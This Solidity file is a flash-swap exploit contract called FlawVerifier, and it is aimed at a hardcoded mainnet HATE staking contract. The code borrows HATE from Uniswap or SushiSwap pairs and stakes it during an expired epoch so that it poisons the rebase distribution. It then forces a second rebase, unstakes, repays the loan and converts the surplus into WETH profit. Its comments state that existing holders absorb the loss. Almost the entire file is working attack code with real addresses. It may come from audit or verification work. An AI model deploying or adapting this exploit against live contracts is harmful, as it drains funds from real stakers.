// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IsHATELike is IERC20Like {
    function circulatingSupply() external view returns (uint256);
}

interface IHATEStaking {
    function HATE() external view returns (address);
    function sHATE() external view returns (address);
    function epoch() external view returns (uint256 length, uint256 number, uint256 end, uint256 distribute);
    function stake(address to, uint256 amount) external;
    function unstake(address to, uint256 amount, bool rebase_) external;
    function rebase() external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x8EBd6c7D2B79CA4Dc5FBdEc239a8Bb0F214212b8;

    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;

    uint256 private _profitAmount;
    bool private _executed;

    constructor() {}

    function profitToken() external view returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        require(!_executed, "already executed");
        _executed = true;

        IHATEStaking staking = IHATEStaking(TARGET);
        address hate = staking.HATE();
        uint256 startingProfitBalance = IERC20Like(WETH).balanceOf(address(this));

        _checkPathPreconditions(staking);

        uint256 verifierBalance = IERC20Like(hate).balanceOf(address(this));
        if (verifierBalance != 0) {
            uint256 amount = _boundAttackAmount(staking, verifierBalance);
            require(amount != 0, "direct:no_usable_hate");

            _executeExploit(staking, hate, amount);
            _realizeHateIntoWeth(hate);

            uint256 endingProfitBalance = IERC20Like(WETH).balanceOf(address(this));
            require(endingProfitBalance > startingProfitBalance, "direct:no_profit");
            _profitAmount = endingProfitBalance - startingProfitBalance;
            return;
        }

        require(_attemptFlashFunding(staking, hate), "funding:no_supported_hate_liquidity");
        require(_profitAmount != 0, "flashswap:no_profit");
    }

    function initiateFlashSwap(address pair, uint256 amountOut) external {
        require(msg.sender == address(this), "self_only");

        address hate = IHATEStaking(TARGET).HATE();
        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();
        require(token0 == hate || token1 == hate, "pair:no_hate");

        uint256 amount0Out = token0 == hate ? amountOut : 0;
        uint256 amount1Out = token1 == hate ? amountOut : 0;
        IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), abi.encode(pair, amountOut));
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata data) external {
        (address pair, uint256 borrowedAmount) = abi.decode(data, (address, uint256));
        require(msg.sender == pair, "callback:invalid_pair");

        address hate = IHATEStaking(TARGET).HATE();
        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();
        require(token0 == hate || token1 == hate, "callback:no_hate");

        uint256 received = token0 == hate ? amount0 : amount1;
        require(received == borrowedAmount, "callback:amount_mismatch");

        IHATEStaking staking = IHATEStaking(TARGET);
        _executeExploit(staking, hate, borrowedAmount);

        uint256 repayment = borrowedAmount + _flashFee(borrowedAmount);
        _safeTransfer(hate, pair, repayment);

        uint256 remaining = IERC20Like(hate).balanceOf(address(this));
        require(remaining != 0, "callback:no_profit");
    }

    receive() external payable {}

    function _attemptFlashFunding(IHATEStaking staking, address hate) internal returns (bool) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        address[5] memory counterparties = [WETH, USDC, USDT, DAI, FRAX];
        uint256[4] memory bpsOptions = [uint256(9_000), uint256(7_500), uint256(5_000), uint256(2_500)];

        for (uint256 i = 0; i < factories.length; ++i) {
            for (uint256 j = 0; j < counterparties.length; ++j) {
                if (counterparties[j] == hate) {
                    continue;
                }

                address pair = IUniswapV2FactoryLike(factories[i]).getPair(hate, counterparties[j]);
                if (pair == address(0)) {
                    continue;
                }

                uint256 reserve = _hateReserve(pair, hate);
                if (reserve == 0) {
                    continue;
                }

                uint256 maxUseful = _boundAttackAmount(staking, reserve);
                if (maxUseful == 0) {
                    continue;
                }

                for (uint256 k = 0; k < bpsOptions.length; ++k) {
                    uint256 candidate = (maxUseful * bpsOptions[k]) / 10_000;
                    if (candidate == 0) {
                        continue;
                    }

                    uint256 minRepayment = candidate + _flashFee(candidate);
                    uint256 circulating = IsHATELike(staking.sHATE()).circulatingSupply();
                    uint256 minimumStageThreeGain =
                        circulating == 0 ? candidate : (candidate * candidate) / (circulating + candidate);
                    if (minimumStageThreeGain <= (minRepayment - candidate)) {
                        continue;
                    }

                    try this.initiateFlashSwap(pair, candidate) {
                        uint256 realized = _realizeHateIntoWeth(hate);
                        if (realized != 0) {
                            _profitAmount = realized;
                            return true;
                        }
                    } catch {
                        continue;
                    }
                }
            }
        }

        return false;
    }

    function _executeExploit(IHATEStaking staking, address hate, uint256 amount) internal {
        require(amount != 0, "exploit:zero_amount");

        _checkPathPreconditions(staking);

        address sHate = staking.sHATE();

        // Path stage 1:
        // Wait until `epoch.end <= block.timestamp` so `stake()` will execute `rebase()`.
        _assertExpiredEpoch(staking);

        // Path stage 2:
        // Call `stake(attacker, A)`, causing `A` HATE to be transferred into the staking contract
        // before the matching `A` sHATE is sent out. That ordering poisons the newly computed
        // `epoch.distribute` because the principal is counted in HATE backing while the matching
        // sHATE is still excluded from `circulatingSupply()`.
        _approveMax(hate, TARGET, amount);
        staking.stake(address(this), amount);

        // Path stage 3:
        // Let the next rebase execute after the poisoned `epoch.distribute` has been stored, then
        // redeem the attacker position while existing holders absorb the shortfall. On a fixed fork
        // we cannot advance time, so this verifier only executes when the system is already at least
        // one full additional epoch behind and a second rebase is immediately callable.
        _assertSecondExpiredEpoch(staking);
        staking.rebase();

        uint256 sBalance = IERC20Like(sHate).balanceOf(address(this));
        require(sBalance != 0, "exploit:no_sHATE");

        _approveMax(sHate, TARGET, sBalance);
        staking.unstake(address(this), sBalance, false);
    }

    function _boundAttackAmount(IHATEStaking staking, uint256 fundingCeiling) internal view returns (uint256) {
        address hate = staking.HATE();
        address sHate = staking.sHATE();

        uint256 stakingBalance = IERC20Like(hate).balanceOf(TARGET);
        uint256 circulating = IsHATELike(sHate).circulatingSupply();

        uint256 cap = fundingCeiling;
        if (stakingBalance < cap) {
            cap = stakingBalance;
        }
        if (circulating != 0 && circulating < cap) {
            cap = circulating;
        }

        return cap;
    }

    function _hateReserve(address pair, address hate) internal view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        if (IUniswapV2PairLike(pair).token0() == hate) {
            return uint256(reserve0);
        }
        if (IUniswapV2PairLike(pair).token1() == hate) {
            return uint256(reserve1);
        }
        return 0;
    }

    function _checkPathPreconditions(IHATEStaking staking) internal view {
        (uint256 length,, uint256 end,) = staking.epoch();
        require(length != 0, "path:zero_epoch_length");
        require(end <= block.timestamp, "path:not_expired");
        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
    }

    function _assertExpiredEpoch(IHATEStaking staking) internal view {
        (, , uint256 end,) = staking.epoch();
        require(end <= block.timestamp, "path:not_expired");
    }

    function _assertSecondExpiredEpoch(IHATEStaking staking) internal view {
        (uint256 length,, uint256 end,) = staking.epoch();
        require(length != 0, "path:zero_epoch_length");
        require(end <= block.timestamp, "path:no_second_expired_epoch");
    }

    function _flashFee(uint256 amount) internal pure returns (uint256) {
        return ((amount * 3) / 997) + 1;
    }

    function _realizeHateIntoWeth(address hate) internal returns (uint256 realized) {
        uint256 amountIn = IERC20Like(hate).balanceOf(address(this));
        if (amountIn == 0) {
            return 0;
        }

        // The bug directly yields surplus HATE. Converting that HATE through a live HATE/WETH pair is a
        // realistic public exit step that preserves the same exploit causality while reporting profit in an
        // existing on-chain asset with stable 18-decimal accounting.
        (address bestPair, uint256 bestAmountOut, bool hateIsToken0) = _bestHateToWethQuote(hate, amountIn);
        require(bestPair != address(0), "realize:no_hate_weth_pair");
        require(bestAmountOut != 0, "realize:no_output");

        uint256 wethBefore = IERC20Like(WETH).balanceOf(address(this));
        _safeTransfer(hate, bestPair, amountIn);

        uint256 amount0Out = hateIsToken0 ? 0 : bestAmountOut;
        uint256 amount1Out = hateIsToken0 ? bestAmountOut : 0;
        IUniswapV2PairLike(bestPair).swap(amount0Out, amount1Out, address(this), new bytes(0));

        uint256 wethAfter = IERC20Like(WETH).balanceOf(address(this));
        require(wethAfter > wethBefore, "realize:no_profit");
        return wethAfter - wethBefore;
    }

    function _bestHateToWethQuote(address hate, uint256 amountIn)
        internal
        view
        returns (address bestPair, uint256 bestAmountOut, bool hateIsToken0)
    {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];

        for (uint256 i = 0; i < factories.length; ++i) {
            address pair = IUniswapV2FactoryLike(factories[i]).getPair(hate, WETH);
            if (pair == address(0)) {
                continue;
            }

            (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
            address token0 = IUniswapV2PairLike(pair).token0();
            address token1 = IUniswapV2PairLike(pair).token1();

            uint256 reserveIn;
            uint256 reserveOut;
            bool quoteHateIsToken0;

            if (token0 == hate && token1 == WETH) {
                reserveIn = uint256(reserve0);
                reserveOut = uint256(reserve1);
                quoteHateIsToken0 = true;
            } else if (token1 == hate && token0 == WETH) {
                reserveIn = uint256(reserve1);
                reserveOut = uint256(reserve0);
                quoteHateIsToken0 = false;
            } else {
                continue;
            }

            if (reserveIn == 0 || reserveOut == 0) {
                continue;
            }

            uint256 amountOut = _getAmountOut(amountIn, reserveIn, reserveOut);
            if (amountOut > bestAmountOut) {
                bestPair = pair;
                bestAmountOut = amountOut;
                hateIsToken0 = quoteHateIsToken0;
            }
        }
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
    }

    function _approveMax(address token, address spender, uint256 minimum) internal {
        if (IERC20Like(token).allowance(address(this), spender) >= minimum) {
            return;
        }

        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, type(uint256).max));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool ok, bytes memory returndata) = token.call(data);
        require(ok, "erc20:call_failed");
        if (returndata.length != 0) {
            require(abi.decode(returndata, (bool)), "erc20:operation_failed");
        }
    }
}
